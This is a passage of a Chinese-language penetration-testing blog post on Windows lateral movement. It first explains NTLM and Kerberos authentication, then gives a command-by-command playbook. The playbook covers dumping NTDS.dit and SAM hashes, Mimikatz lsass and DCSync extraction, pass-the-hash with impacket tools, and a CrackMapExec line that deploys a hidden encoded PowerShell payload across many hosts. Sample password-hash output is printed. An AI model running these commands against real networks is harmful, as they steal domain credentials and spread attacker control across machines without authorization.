<h3 id="网络认证-Net-NTLM"><a href="#网络认证-Net-NTLM" class="headerlink" title="网络认证 Net NTLM"></a>网络认证 Net NTLM</h3><h4 id="工作组中"><a href="#工作组中" class="headerlink" title="工作组中"></a>工作组中</h4><p>在工作组环境中，要进行文件共享，需要使用smb协议，smb协议一般使用的端口为139,445。</p>
<p>早期SMB协议在网络上传输明文口令。后来出现LAN Manager Challenge/Response 验证机制，简称LM，后来微软提出了 WindowsNT 挑战/响应验证机制,称之为NTLM。</p>
<p>NTLM协议的认证过程分为三步：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">协商</span><br><span class="line">质询</span><br><span class="line">验证</span><br></pre></td></tr></table></figure>

<p>协商：双方确定使用的协议版本，NTLM存在V1和V2两个版本</p>
<p>质询：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.客户端向服务器端发送用户信息(用户名)请求</span><br><span class="line"></span><br><span class="line">2.服务器接受到请求后，判断本地用户列表是否存在客户端发送的用户名，如果没有返回认证失败，如果有，生成一个16位的随机数，被称之为“Challenge”， 然后使用登录用户名对应的NTLM Hash加密Challenge(16位随机字符)， 生成Challenge1保存在内存中。同时，生成Challenge1后，将Challenge(16位随机字符)发送给客户端。即Challenge1保存在当前机器，Challenge发送给客户端。</span><br><span class="line"></span><br><span class="line">3.客户端接受到Challenge后，使用自己提供的账户的密码转换成对应的NTLM Hash，然后使用这个NTLM Hash加密Challenge生成Response，然后将Response发送至服务器端。</span><br><span class="line">4.服务端收到客户端发送的Response后，与之前保存在内存中的Challenge1比较，如果相等认证通过。</span><br></pre></td></tr></table></figure>

<p>所以对Challenge进行加密都要使用对应用户名的<code>NTLM Hash</code>。加密后的结果称之为Net NTLM Hash。</p>
<p>关键点：</p>
<p>客户端发送的是NTLM哈希值与随机字符串加密的结果，而这个NTLM哈希是由用户输入的密码本地计算得出的，所以在这个步骤中，只要能提供正确的NTLM哈希即使不知道正确的密码也可通过认证。</p>
<h4 id="域环境中"><a href="#域环境中" class="headerlink" title="域环境中"></a>域环境中</h4><p>域环境中检验过程在域控制器中，主要区别就是通过比较 Net-NTLM Hash(基于NTLM Hash生成)的结果来比较NTML Hash是否正确。</p>
<h3 id="域认证（Kerberos）"><a href="#域认证（Kerberos）" class="headerlink" title="域认证（Kerberos）"></a>域认证（Kerberos）</h3><p>域内认证即采用了Kerberos协议的认证机制，与前两者相比最大的区别是有个一个可信的第三方机构KDC的参与。</p>
<p>域认证的三个角色：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Client</span><br><span class="line">Server</span><br><span class="line">KDC(Key Distribution Center) &#x3D; DC(Domain Controller) &#x3D; AD（Account Database）+ AS（Authenication Service）+ TGS（Ticket Granting Service）</span><br></pre></td></tr></table></figure>

<p>KDC，密钥分发中心(AS和TGS组成),默认安装在域控中。</p>
<p>AS，身份认证服务器，根据用户名提取NTLM Hash做为AS生成的<code>CLIENT 密钥</code>，也就是说给client提供密钥，并且返回由<code>CLIENT密钥</code> 加密的<code>CLIENT/TGS SESSIONKEY</code>以及<code>GS密钥</code> 加密的<code>TGT(TICKET-GRANTING-TICKET)</code>。</p>
<p>TGS，票据授权服务器。</p>
<p>AD，全称叫account database，存储域中所有用户的用户名和对应的NTLM Hash，可以理解为域中的SAM数据库。</p>
<p>基础概念</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">票据（Ticket）：是网络对象互相访问的凭证。</span><br><span class="line">TGT（Ticket Granting Ticket）：用来生成Ticket的Ticket。</span><br><span class="line">KDC负责管理票据、认证票据、分发票据。</span><br><span class="line">KDC组成：</span><br><span class="line">Authentication Service: 简称AS，为Client生成TGT的服务，也用来完成对Client的身份验证。</span><br><span class="line">Ticket Granting Service: 为Client生成允许对某个服务访问的ticket，就是Client从AS那里拿到TGT之后，来TGS这里再申请对某个特定服务或服务器访问的Ticket，只有获取到这个Ticket，Client才有权限去访问对应的服务</span><br></pre></td></tr></table></figure>

<p>认证流程：</p>
<p>1、客户端向KDC中的AS发送一个Authenticatior1，Authenticatior1由当前请求用户使用自身密码的哈希对时间戳、Client ID、网络地址、解密类型等内容进行加密。</p>
<p>2、AS接收到请求之后，会判断当前请求用户是否可以登录，KDC中存储当前环境中所有用户密码的hash,之后返回给Client由客户端用户对应的hash进行加密的Sessionkey-as和TGT，TGT是由KRBTGT HASH加密的Sessionkey-as和时间戳等信息。</p>
<p>Sessionkey-as是由客户端的Hash加密的，TGT是由KRBTGT HASH加密的。</p>
<p>3、客户端收到Sessionkey-as和TGT，可以使用自身的Hash对Sessionkey-as进行解密，但是不可以对TGT进行解密，客户端向TGS发送内容为用sessionkey-as加密的时间戳Authenticator2和票据TGT来获取能够访问Server的票据。</p>
<p>4、TGS收到Authenticator2和票据TGT之后，检察当前是否存在客户端请求的服务，如果存在则使用KRBTGT密码解密TGT拿到Sessionkey-as。验证成功之后将sessionkey-as加密的Sessionkey-tgs和票据ST(Server密码Hash加密的Sessionkey-tgs)发送给Client。</p>
<p>5、Client收到Sessionkey-as加密的sessionkey-tgs和票据(Server密码Hash加密的sessionkey-tgs)之后用sessionkey-as解密得到的sessionkey-tgs,然后把内容为Sessionkey-tgs加密的时间戳Authenticator3和票据ST一起发送给Server。</p>
<p>6、Server通过自己的密码解密票据ST,得到sessionkey-tgs，再用sessionkey-tgs解密Authenticator3得到时间戳，验证正确返回验证成功</p>
<h2 id="哈希传递"><a href="#哈希传递" class="headerlink" title="哈希传递"></a>哈希传递</h2><h3 id="Windows密码和哈希的获取"><a href="#Windows密码和哈希的获取" class="headerlink" title="Windows密码和哈希的获取"></a>Windows密码和哈希的获取</h3><p>目的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">远程登录目标机器，并为了哈希传递和票据攻击做基础。</span><br></pre></td></tr></table></figure>

<h4 id="获取域内所有用户hash"><a href="#获取域内所有用户hash" class="headerlink" title="获取域内所有用户hash"></a>获取域内所有用户hash</h4><h5 id="登录域控制器获取hash"><a href="#登录域控制器获取hash" class="headerlink" title="登录域控制器获取hash"></a>登录域控制器获取hash</h5><p>域内所有用户的凭据信息(hash)存储在域控制器中的c:\windows\ntds\ntds.dit中。</p>
<p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201209111511447.png" alt="image-20201209111511447"></p>
<p>sam文件存储着当前主机用户的密码信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ntds.dit文件位置: C:\Windows\NTDS\NTDS.dit</span><br><span class="line">system文件位置:C:\Windows\System32\config\SYSTEM</span><br><span class="line">sam文件位置:C:\Windows\System32\config\SAM</span><br></pre></td></tr></table></figure>

<p>想要破解sam文件与ntds.dit文件都需要拥有一个system文件。</p>
<p>创建快照</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br><span class="line">ntdsutil: snapshot</span><br><span class="line">快照: activate instance ntds</span><br><span class="line">使用中執行個體已設定為 &quot;ntds&quot;。</span><br><span class="line">快照: create</span><br><span class="line">正在建立快照...</span><br><span class="line">快照集 &#123;1dc812ae-3ae6-475b-bb67-ccafe028ae69&#125; 已經成功產生。</span><br><span class="line">快照: quit</span><br><span class="line">ntdsutil: quit</span><br></pre></td></tr></table></figure>

<p>挂载快照</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;ntdsutil snapshot &quot;mount &#123;1dc812ae-3ae6-475b-bb67-ccafe028ae</span><br><span class="line">69&#125;&quot; quit quit</span><br><span class="line">ntdsutil: snapshot</span><br><span class="line">快照: mount &#123;1dc812ae-3ae6-475b-bb67-ccafe028ae69&#125;</span><br><span class="line">快照 &#123;3f3a24b3-ce4f-4096-852a-0b3864a8909d&#125; 已掛接為 C:\$SNAP_202012062103_VOLUM</span><br><span class="line">EC$\</span><br><span class="line">快照: quit</span><br><span class="line">ntdsutil: quit</span><br></pre></td></tr></table></figure>

<p>复制<code>ntds.dit</code>到本地</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;copy C:\$SNAP_202012062103_VOLUMEC$\Windows\NTDS\ntds.dit c:</span><br><span class="line">\ntds.dit</span><br><span class="line">複製了         1 個檔案。</span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure>

<p>解除挂载：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;unmount &#123;1dc812ae-3ae6-475b-bb67-ccafe028ae</span><br><span class="line">69&#125;&quot; quit quit</span><br></pre></td></tr></table></figure>

<p>删除快照：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;delete &#123;1dc812ae-3ae6-475b-bb67-ccafe028ae</span><br><span class="line">69&#125;&quot; quit quit</span><br></pre></td></tr></table></figure>

<p>然后通过注册表的方式获取KEY</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM c:\windows\temp\system.hiv</span><br></pre></td></tr></table></figure>

<p>然后开始解密</p>
<p>本地使用<code>secretsdump.py</code>，导出hash。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py -ntds ntds.dit -system sys.hiv LOCAL</span><br></pre></td></tr></table></figure>

<p>导出来之后的文件如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">STPC-24$:7823:aad3b435b51404eeaad3b435b51404ee:a5522abc1d8a4901f7be863ea7f5d5d6:::</span><br><span class="line">STPC-35$:12126:aad3b435b51404eeaad3b435b51404ee:cfd2cbe90a73cc1da1dfcd281312134e:::</span><br><span class="line">STPC-15$:11125:aad3b435b51404eeaad3b435b51404ee:db561df3e26ab8dd270d138c74cc7485:::</span><br><span class="line">3060-4B$:15133:aad3b435b51404eeaad3b435b51404ee:ecd695ea2a81472caad57d3b77e7292a:::</span><br></pre></td></tr></table></figure>

<p>破解出的密码格式为<code>domain\uid:rid:lmhash:nthash</code>。</p>
<h5 id="迷你卡姿获取"><a href="#迷你卡姿获取" class="headerlink" title="迷你卡姿获取"></a>迷你卡姿获取</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;domain:test.local &#x2F;all &#x2F;csv</span><br></pre></td></tr></table></figure>

<h5 id="CS获取"><a href="#CS获取" class="headerlink" title="CS获取"></a>CS获取</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.查询域内所有hash</span><br><span class="line">    dcsync [DOMAIN.FQDN]</span><br><span class="line">2.查询指定用户hash</span><br><span class="line">    dcsync [DOMAIN.FQDN] [DOMAIN\user]</span><br></pre></td></tr></table></figure>

<h4 id="获取本机用户hash"><a href="#获取本机用户hash" class="headerlink" title="获取本机用户hash"></a>获取本机用户hash</h4><h5 id="读取lsass进程的信息"><a href="#读取lsass进程的信息" class="headerlink" title="读取lsass进程的信息"></a>读取lsass进程的信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonPasswords</span><br></pre></td></tr></table></figure>

<h5 id="读取SAM数据库"><a href="#读取SAM数据库" class="headerlink" title="读取SAM数据库"></a>读取SAM数据库</h5><p>获取用户Hash,获取系统所有本地用户的hash</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure>

<h5 id="SAM表离线获取hash"><a href="#SAM表离线获取hash" class="headerlink" title="SAM表离线获取hash"></a>SAM表离线获取hash</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">reg save HKLM\SAM SAM</span><br><span class="line">lsadump::sam &#x2F;sam:SAM &#x2F;system:SYSTEM</span><br></pre></td></tr></table></figure>

<h5 id="转储lsass进程离线获取hash"><a href="#转储lsass进程离线获取hash" class="headerlink" title="转储lsass进程离线获取hash"></a>转储lsass进程离线获取hash</h5><p>找到lsass进程,然后创建转储文件-&gt;将该文件下载回来放置在Mimikatz的同目录下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump lsass.DMP</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure>

<h3 id="Hash传递方式"><a href="#Hash传递方式" class="headerlink" title="Hash传递方式"></a>Hash传递方式</h3><p>哈希传递需要配合445,135,139,5985 (http) 或 5986(https) 这四个端口的服务来进行的。</p>
<h4 id="Mimikatz-交互式获取"><a href="#Mimikatz-交互式获取" class="headerlink" title="Mimikatz 交互式获取"></a>Mimikatz 交互式获取</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:workgroup &#x2F;ntlm:852a844adfce18f66009b4f14e0a98de</span><br></pre></td></tr></table></figure>

<h4 id="impacket套装"><a href="#impacket套装" class="headerlink" title="impacket套装"></a>impacket套装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python psexec.py  administrator@10.73.147.29   -hashes 624aac413795cdc1a5c7b1e00f780017:852a844adfce18f66009b4f14e0a98de</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py -hashes 624aac413795cdc1a5c7b1e00f780017:852a844adfce18f66009b4f14e0a98de administrator@10.73.147.29</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbexec.py administrator@10.10.10.3 -hashes :a9398c8a95dbe6801f280d2cfb9c76de</span><br></pre></td></tr></table></figure>

<p>smbexec可以通过文件共享在运程系统中执行命令。对方主机需要开启 <strong><em>\</em>c$**</strong> 共享，依赖于<strong>445</strong>端口。</p>
<p>注意这里的用户名和hash还有ip一定要对应起来。</p>
<h3 id="pth批量横向移动"><a href="#pth批量横向移动" class="headerlink" title="pth批量横向移动"></a>pth批量横向移动</h3><p>批量哈希传递</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  cme python3 crackmapexec smb 10.10.10.0&#x2F;24 -u administrator -H a9398c8a95dbe6801f280d2cfb9c76de</span><br></pre></td></tr></table></figure>

<p>批量上马</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme smb 10.211.55.51  10.211.55.52 -u administrator  -H 852a844adfce18f66009b4f14e0a98de -x &quot;powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0...&quot;</span><br></pre></td></tr></table></figure>


  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/tags/">标签</a></li>
         
          <li><a href="/categories/">分类</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E2%80%93%E6%A8%AA%E5%90%91%E7%BA%B5%E6%A8%AA1"><span class="toc-number">1.</span> <span class="toc-text">内网渗透–横向纵横1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Hash%E7%9A%84%E8%AE%A4%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text">Hash的认识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LM-Hash"><span class="toc-number">1.1.1.</span> <span class="toc-text">LM Hash</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LM-Hash%E7%94%9F%E6%88%90%E8%BF%87%E7%A8%8B"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">LM Hash生成过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LM-Hash%E7%9A%84%E7%BC%BA%E7%82%B9"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">LM Hash的缺点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E8%BF%87%E7%A8%8B"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">生成过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NTLM-Hash"><span class="toc-number">1.1.2.</span> <span class="toc-text">NTLM Hash</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B-1"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NTLM-Hash-%E7%94%9F%E6%88%90%E8%BF%87%E7%A8%8B"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">NTLM Hash 生成过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WINDOWS%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6"><span class="toc-number">1.2.</span> <span class="toc-text">WINDOWS认证机制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SAM"><span class="toc-number">1.2.1.</span> <span class="toc-text">SAM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81"><span class="toc-number">1.2.2.</span> <span class="toc-text">本地认证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E8%AE%A4%E8%AF%81-Net-NTLM"><span class="toc-number">1.2.3.</span> <span class="toc-text">网络认证 Net NTLM</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%B8%AD"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">工作组中</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">域环境中</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E8%AE%A4%E8%AF%81%EF%BC%88Kerberos%EF%BC%89"><span class="toc-number">1.2.4.</span> <span class="toc-text">域认证（Kerberos）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92"><span class="toc-number">1.3.</span> <span class="toc-text">哈希传递</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E5%AF%86%E7%A0%81%E5%92%8C%E5%93%88%E5%B8%8C%E7%9A%84%E8%8E%B7%E5%8F%96"><span class="toc-number">1.3.1.</span> <span class="toc-text">Windows密码和哈希的获取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%86%85%E6%89%80%E6%9C%89%E7%94%A8%E6%88%B7hash"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">获取域内所有用户hash</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E8%8E%B7%E5%8F%96hash"><span class="toc-number">1.3.1.1.1.</span> <span class="toc-text">登录域控制器获取hash</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%B7%E4%BD%A0%E5%8D%A1%E5%A7%BF%E8%8E%B7%E5%8F%96"><span class="toc-number">1.3.1.1.2.</span> <span class="toc-text">迷你卡姿获取</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CS%E8%8E%B7%E5%8F%96"><span class="toc-number">1.3.1.1.3.</span> <span class="toc-text">CS获取</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%9C%AC%E6%9C%BA%E7%94%A8%E6%88%B7hash"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">获取本机用户hash</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96lsass%E8%BF%9B%E7%A8%8B%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-number">1.3.1.2.1.</span> <span class="toc-text">读取lsass进程的信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96SAM%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.3.1.2.2.</span> <span class="toc-text">读取SAM数据库</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SAM%E8%A1%A8%E7%A6%BB%E7%BA%BF%E8%8E%B7%E5%8F%96hash"><span class="toc-number">1.3.1.2.3.</span> <span class="toc-text">SAM表离线获取hash</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BD%AC%E5%82%A8lsass%E8%BF%9B%E7%A8%8B%E7%A6%BB%E7%BA%BF%E8%8E%B7%E5%8F%96hash"><span class="toc-number">1.3.1.2.4.</span> <span class="toc-text">转储lsass进程离线获取hash</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hash%E4%BC%A0%E9%80%92%E6%96%B9%E5%BC%8F"><span class="toc-number">1.3.2.</span> <span class="toc-text">Hash传递方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Mimikatz-%E4%BA%A4%E4%BA%92%E5%BC%8F%E8%8E%B7%E5%8F%96"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">Mimikatz 交互式获取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#impacket%E5%A5%97%E8%A3%85"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">impacket套装</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pth%E6%89%B9%E9%87%8F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">1.3.3.</span> <span class="toc-text">pth批量横向移动</span></a></li></ol></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://s1eady.top/2020/12/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E6%A8%AA%E5%90%91%E7%BA%B5%E6%A8%AA1/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://s1eady.top/2020/12/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E6%A8%AA%E5%90%91%E7%BA%B5%E6%A8%AA1/&text=内网学习--Metasploit使用"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://s1eady.top/2020/12/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E6%A8%AA%E5%90%91%E7%BA%B5%E6%A8%AA1/&title=内网学习--Metasploit使用"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://s1eady.top/2020/12/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E6%A8%AA%E5%90%91%E7%BA%B5%E6%A8%AA1/&is_video=false&description=内网学习--Metasploit使用"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=内网学习--Metasploit使用&body=Check out this article: http://s1eady.top/2020/12/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E6%A8%AA%E5%90%91%E7%BA%B5%E6%A8%AA1/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://s1eady.top/2020/12/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E6%A8%AA%E5%90%91%E7%BA%B5%E6%A8%AA1/&title=内网学习--Metasploit使用"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://s1eady.top/2020/12/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E6%A8%AA%E5%90%91%E7%BA%B5%E6%A8%AA1/&title=内网学习--Metasploit使用"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://s1eady.top/2020/12/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E6%A8%AA%E5%90%91%E7%BA%B5%E6%A8%AA1/&title=内网学习--Metasploit使用"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://s1eady.top/2020/12/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E6%A8%AA%E5%90%91%E7%BA%B5%E6%A8%AA1/&title=内网学习--Metasploit使用"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://s1eady.top/2020/12/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E6%A8%AA%E5%90%91%E7%BA%B5%E6%A8%AA1/&name=内网学习--Metasploit使用&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://s1eady.top/2020/12/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E6%A8%AA%E5%90%91%E7%BA%B5%E6%A8%AA1/&t=内网学习--Metasploit使用"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2018.12.8-2020
    steady
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
